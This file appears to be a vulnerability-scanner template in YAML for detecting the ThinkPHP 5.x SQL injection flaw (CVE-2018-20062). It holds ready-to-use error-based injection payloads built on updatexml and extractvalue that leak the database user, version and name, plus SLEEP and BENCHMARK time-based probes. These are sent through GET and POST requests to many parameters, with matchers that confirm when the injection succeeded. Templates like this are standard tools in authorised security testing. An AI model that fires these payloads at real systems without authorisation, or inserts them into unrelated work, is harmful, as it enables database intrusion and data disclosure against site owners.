id: thinkphp-sqli
info:
  name: ThinkPHP SQL Injection (in-sqlinjection)
  severity: Critical
  description: |
    检测 ThinkPHP 5.x 版本中存在的 SQL 注入漏洞 (CVE-2018-20062 等)。
    该漏洞存在于数组参数的 SQL 查询中，可利用 updatexml/extractvalue 函数进行报错注入。
    影响版本: ThinkPHP 5.0.x < 5.0.24, 5.1.x < 5.1.31
  tags:
    - sqli
    - thinkphp
    - updatexml
    - in-sqlinjection
  reference:
    - https://vulhub.org/#/environments/thinkphp/in-sqlinjection/
    - https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection

payload_sets:
  default:
    - "0,updatexml(0,concat(0xa,user()),0)"
    - "0,updatexml(0,concat(0xa,version()),0)"
    - "0,extractvalue(1,concat(0xa,user()))"
    - "1) and updatexml(1,concat(0xa,(user())),1)"
    - "1' and updatexml(1,concat(0xa,(user())),1)#"
  aggressive:
    - "0,updatexml(0,concat(0xa,user()),0)"
    - "0,updatexml(0,concat(0xa,version()),0)"
    - "0,updatexml(0,concat(0xa,database()),0)"
    - "0,extractvalue(1,concat(0xa,user()))"
    - "0,extractvalue(1,concat(0xa,version()))"
    - "1) and updatexml(1,concat(0xa,database()),1)"
    - "1' and extractvalue(1,concat(0xa,user()))#"
    - "0) or updatexml(1,concat(0xa,(select user())),1)#"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?ids[{{payload}}]=1"
      - "{{BaseURL}}/?s=index/index/index&ids[{{payload}}]=1"
      - "{{BaseURL}}/index.php?s=/index/index/index&ids[{{payload}}]=1"
      - "{{BaseURL}}/index.php?data[{{payload}}]=1"
      - "{{BaseURL}}/index.php?field[{{payload}}]=1"
      - "{{BaseURL}}/index.php?order[{{payload}}]=1"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "XPATH syntax error"
          - "XPATH syntax error:"
          - "extractvalue()"
          - "updatexml()"
          - "SQLSTATE[42"
          - "SQLSTATE[HY000]: General error"
          - "SQLSTATE[42000]"
          - "SQLSTATE[42S22]"
          - "SQLSTATE[21S01]"
          - "SQLSTATE[23000]"
          - "You have an error in your SQL syntax"
          - "check the manual that corresponds to your MySQL"
          - "Think\\Db\\Exception"
          - "ThinkException"
          - "PDO::prepare()"
          - "PDOException"
          - "Connection.php line"
          - "Query.php line"
          - "->query("
          - "where_id_in_"
          - "Call Stack"
        condition: or
        part: body
      - type: word
        words:
          - "Drupal.settings"
          - "form_build_id"
          - "_drupal_ajax"
          - "drupal.js"
          - "X-Generator: Drupal"
          - "user_register_form"
          - "sites/default/files"
        condition: or
        part: body
        negative: true
      - type: status
        status: [500, 200]

  - method: GET
    path:
      - "{{BaseURL}}/index.php?id={{payload}}"
      - "{{BaseURL}}/?s=index/index/index&id={{payload}}"
      - "{{BaseURL}}/index.php?name={{payload}}"
      - "{{BaseURL}}/index.php?username={{payload}}"
      - "{{BaseURL}}/index.php?user={{payload}}"
      - "{{BaseURL}}/index.php?search={{payload}}"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "XPATH syntax error"
          - "XPATH syntax error:"
          - "extractvalue()"
          - "updatexml()"
          - "SQLSTATE[42"
          - "SQLSTATE[HY000]: General error"
          - "SQLSTATE[42000]"
          - "SQLSTATE[42S22]"
          - "Think\\Db\\Exception"
          - "PDOException"
          - "Connection.php line"
          - "Query.php line"
          - "Call Stack"
        condition: or
        part: body
      - type: word
        words:
          - "Drupal.settings"
          - "form_build_id"
          - "_drupal_ajax"
          - "X-Generator: Drupal"
          - "user_register_form"
        condition: or
        part: body
        negative: true
      - type: status
        status: [500, 200]

  - method: POST
    path:
      - "{{BaseURL}}/index.php"
      - "{{BaseURL}}/"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "ids[{{payload}}]=1"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "XPATH syntax error"
          - "XPATH syntax error:"
          - "extractvalue()"
          - "updatexml()"
          - "SQLSTATE[42"
          - "SQLSTATE[HY000]: General error"
          - "SQLSTATE[42000]"
          - "SQLSTATE[42S22]"
          - "Think\\Db\\Exception"
          - "PDOException"
          - "Database Error"
          - "Connection.php line"
          - "Query.php line"
          - "Call Stack"
        condition: or
        part: body
      - type: word
        words:
          - "Drupal.settings"
          - "form_build_id"
          - "_drupal_ajax"
          - "X-Generator: Drupal"
        condition: or
        part: body
        negative: true
      - type: status
        status: [500]

  - method: GET
    path:
      - "{{BaseURL}}/index.php?where[id]={{payload}}"
      - "{{BaseURL}}/index.php?where[{{payload}}]=1"
      - "{{BaseURL}}/index.php?order[id]={{payload}}"
      - "{{BaseURL}}/index.php?order[{{payload}}]=asc"
      - "{{BaseURL}}/index.php?group[id]={{payload}}"
      - "{{BaseURL}}/index.php?having[id]={{payload}}"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "XPATH syntax error"
          - "XPATH syntax error:"
          - "extractvalue()"
          - "updatexml()"
          - "SQLSTATE[42"
          - "SQLSTATE[HY000]: General error"
          - "SQLSTATE[42000]"
          - "SQLSTATE[42S22]"
          - "Think\\Db\\Exception"
          - "Database Error"
          - "SQL Error"
          - "Connection.php line"
          - "Query.php line"
          - "Call Stack"
        condition: or
        part: body
      - type: word
        words:
          - "Drupal.settings"
          - "form_build_id"
          - "_drupal_ajax"
          - "X-Generator: Drupal"
        condition: or
        part: body
        negative: true
      - type: status
        status: [500]

  - method: GET
    path:
      - "{{BaseURL}}/index.php?ids[SLEEP(3)]=1"
      - "{{BaseURL}}/index.php?ids[BENCHMARK(5000000,SHA1('test'))]=1"
      - "{{BaseURL}}/index.php?id=SLEEP(3)%23"
    matchers-condition: and
    matchers:
      - type: status
        status: [200, 500]
      - type: time
        min_ms: 2500
